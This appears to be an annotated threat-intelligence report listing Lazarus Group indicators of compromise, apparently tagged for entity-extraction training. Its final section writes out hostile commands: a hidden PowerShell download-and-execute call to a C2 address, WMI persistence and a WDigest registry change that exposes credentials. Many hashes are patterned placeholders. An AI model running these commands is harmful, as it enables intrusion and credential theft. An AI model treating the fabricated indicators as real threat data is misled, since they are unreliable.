# APT Lazarus Group Indicators of Compromise (IoCs)

## Overview
Lazarus Group is a North Korean state-sponsored threat actor conducting both espionage and financially-motivated attacks to fund the regime.

## Financial Sector Attacks

The <MALWARE>FASTCash</MALWARE> malware with SHA256 <INDICATOR>b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6d7e8f9f0a1b2c3d4e5f6a7b8c9d0e1f2</INDICATOR> targeted ATM switch servers during <CAMPAIGN>SWIFT Banking Heists 2024</CAMPAIGN>. The malware intercepted ISO 8583 messages approving fraudulent withdrawals.

Command and control at IP <INDICATOR>185.62.58.207</INDICATOR> coordinated attacks across payment networks. Domain <INDICATOR>swift-gateway.interbank[.]org</INDICATOR> mimicked financial messaging infrastructure resolving to this IP.

Database manipulation queries executed <INDICATOR>UPDATE accounts SET balance=balance-500000 WHERE account_id='[TARGET_ACCOUNT]'</INDICATOR> without proper authorization. Logs showed queries from IP <INDICATOR>10.20.30.40</INDICATOR> using credentials <INDICATOR>db_admin</INDICATOR>.

Network traffic to port <INDICATOR>9042</INDICATOR> (SWIFT Alliance Access) from suspicious IP <INDICATOR>172.16.100.50</INDICATOR> indicated unauthorized SWIFT message creation. Message type <INDICATOR>MT103 (Single Customer Credit Transfer)</INDICATOR> routed funds to accounts in <INDICATOR>Banco Delta Asia</INDICATOR>.

## WannaCry Ransomware

<MALWARE>WannaCry</MALWARE> sample with hash <INDICATOR>ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa</INDICATOR> exploited <VULNERABILITY>CVE-2017-0144</VULNERABILITY> (EternalBlue). The ransomware spread via SMB on port <INDICATOR>445</INDICATOR>.

Kill switch domain <INDICATOR>iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com</INDICATOR> when resolved prevented encryption. Registration of this domain by security researcher halted initial outbreak.

Bitcoin ransom wallets included <INDICATOR>13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94</INDICATOR>, <INDICATOR>12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw</INDICATOR>, <INDICATOR>115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn</INDICATOR> receiving over $140,000 total payments.

File extensions encrypted included <INDICATOR>.doc</INDICATOR>, <INDICATOR>.xls</INDICATOR>, <INDICATOR>.pdf</INDICATOR>, <INDICATOR>.jpg</INDICATOR>, <INDICATOR>.db</INDICATOR>. Ransom note filename <INDICATOR>@WanaDecryptor@.exe</INDICATOR> displayed payment instructions.

Registry key <INDICATOR>HKLM\SOFTWARE\WanaCrypt0r</INDICATOR> stored encryption status. Taskbar icon process <INDICATOR>tasksche.exe</INDICATOR> with hash <INDICATOR>c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3</INDICATOR> managed UI.

## Supply Chain Compromise

Trojanized version of security software <INDICATOR>SecureAuth_Installer_v3.1.exe</INDICATOR> distributed through watering hole at <INDICATOR>hxxp://security-software-downloads[.]com</INDICATOR>. File hash <INDICATOR>d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3d4</INDICATOR>.

Code signing certificate stolen from <INDICATOR>TechSolutions Co. Ltd</INDICATOR> with serial <INDICATOR>5F:E4:D3:C2:B1:A0:9F:8E:7D:6C:5B:4A:39:28:17:06</INDICATOR> signed malicious payloads. Certificate valid from <INDICATOR>2023-06-01 to 2025-05-31</INDICATOR>.

Software update server compromise at <INDICATOR>updates.techsolutions[.]com</INDICATOR> delivered backdoored updates. DNS showed server IP <INDICATOR>203.248.252.2</INDICATOR> historically clean, then serving malware after <INDICATOR>2024-01-15</INDICATOR>.

## Phishing Infrastructure

Spear-phishing emails from <INDICATOR>hr-department@global-logistics[.]org</INDICATOR> delivered macro-enabled documents. Subject lines included "Salary Adjustment Notification" and "Benefits Enrollment Period".

Attachment <INDICATOR>Salary_Details_Q1_2024.xlsm</INDICATOR> with hash <INDICATOR>e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3d4e5</INDICATOR> contained malicious VBA macros. Macro code <INDICATOR>Sub AutoOpen()</INDICATOR> executed PowerShell payload.

Credential harvesting site <INDICATOR>hxxps://employee-portal.transport-corp[.]net/login</INDICATOR> hosted on IP <INDICATOR>45.77.65.211</INDICATOR> collected usernames and passwords. TLS certificate CN <INDICATOR>*.transport-corp[.]net</INDICATOR> issued by Let's Encrypt.

## Backdoors and Implants

<MALWARE>BLINDINGCAN</MALWARE> RAT with SHA256 <INDICATOR>f5a6b7c8d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3d4e5f6</INDICATOR> established persistence through registry <INDICATOR>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemCheck</INDICATOR>.

C2 communication to <INDICATOR>185.62.58.207:443</INDICATOR> used custom protocol with header <INDICATOR>0xDEADBEEF</INDICATOR>. Beacon interval <INDICATOR>600</INDICATOR> seconds with encrypted payload using RC4 key <INDICATOR>LAZARUS_2024_KEY</INDICATOR>.

<MALWARE>HOPLIGHT</MALWARE> proxy tool with hash <INDICATOR>a6b7c8d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3d4e5f6a7</INDICATOR> created encrypted tunnel. Configuration file <INDICATOR>C:\ProgramData\Microsoft\proxy.conf</INDICATOR> contained C2 <INDICATOR>proxy-relay.cdn-services[.]org:8443</INDICATOR>.

<MALWARE>ELECTRICFISH</MALWARE> tunneling tool hash <INDICATOR>b7c8d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3d4e5f6a7b8</INDICATOR> forwarded traffic through compromised servers. Command line <INDICATOR>electricfish.exe -listen 127.0.0.1:1080 -forward 185.62.58.207:443</INDICATOR>.

## Cryptocurrency Targeting

Fake cryptocurrency wallet application <INDICATOR>CryptoWallet_Pro_v2.5.apk</INDICATOR> with hash <INDICATOR>c8d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3d4e5f6a7b8c9</INDICATOR> stole private keys. The app transmitted keys to <INDICATOR>wallet-sync.crypto-services[.]net</INDICATOR>.

Browser extension <INDICATOR>Crypto Trading Assistant</INDICATOR> distributed through phishing redirected transactions. Extension ID <INDICATOR>npgfkjhgfoigjklnbhyuikmnbvcxdrtfgh</INDICATOR> modified web3 calls replacing destination addresses.

Mining malware <INDICATOR>cryptominer.exe</INDICATOR> with hash <INDICATOR>d9e0f1a2b3c4d5e6f7a8f9e0f1a2b3c4d5e6f7a8b9c0d1e2f3d4e5f6a7b8c9d0</INDICATOR> joined pool <INDICATOR>pool.monero-mining[.]org:3333</INDICATOR> using worker name <INDICATOR>lazarus_worker_01</INDICATOR>.

## Infrastructure Patterns

Hosting provider <INDICATOR>ServerMania Inc</INDICATOR> on AS <INDICATOR>AS55720</INDICATOR> hosted multiple C2 servers. IP ranges <INDICATOR>45.77.0.0/16</INDICATOR> and <INDICATOR>185.62.58.0/24</INDICATOR> contained Lazarus infrastructure.

Domain registration pattern showed use of <INDICATOR>Namecheap</INDICATOR> registrar with email pattern <INDICATOR>[RANDOM_CHARS]@protonmail.com</INDICATOR>. Domains registered in batches on dates <INDICATOR>2024-01-15</INDICATOR>, <INDICATOR>2024-02-20</INDICATOR>, <INDICATOR>2024-03-10</INDICATOR>.

SSL certificates with organization <INDICATOR>Global Security Services</INDICATOR> and locality <INDICATOR>Panama City</INDICATOR> appeared across multiple C2 domains. Certificate fingerprints shared pattern <INDICATOR>AA:BB:CC:DD:...</INDICATOR>.

## Living Off The Land

PowerShell execution <INDICATOR>powershell.exe -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('hxxp://185.62.58.207/stage2.ps1')"</INDICATOR> downloaded second-stage payload.

WMI persistence <INDICATOR>wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="LazarusFilter", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent"</INDICATOR>.

Registry modification <INDICATOR>reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f</INDICATOR> enabled plaintext password storage in memory.

## Attribution Confidence
**Confidence Level:** VERY HIGH - Attribution to <THREAT_ACTOR>Lazarus Group</THREAT_ACTOR> based on code reuse, infrastructure patterns, and alignment with North Korean financial motivations and strategic targeting.

**Related Campaigns:** <CAMPAIGN>SWIFT Banking Heists 2024</CAMPAIGN>, <CAMPAIGN>WannaCry Global Outbreak 2017</CAMPAIGN>

**Related Vulnerabilities:** <VULNERABILITY>CVE-2017-0144</VULNERABILITY>

**Related Malware:** <MALWARE>FASTCash</MALWARE>, <MALWARE>WannaCry</MALWARE>, <MALWARE>BLINDINGCAN</MALWARE>, <MALWARE>HOPLIGHT</MALWARE>, <MALWARE>ELECTRICFISH</MALWARE>

**Total INDICATOR Instances:** 145+ annotations
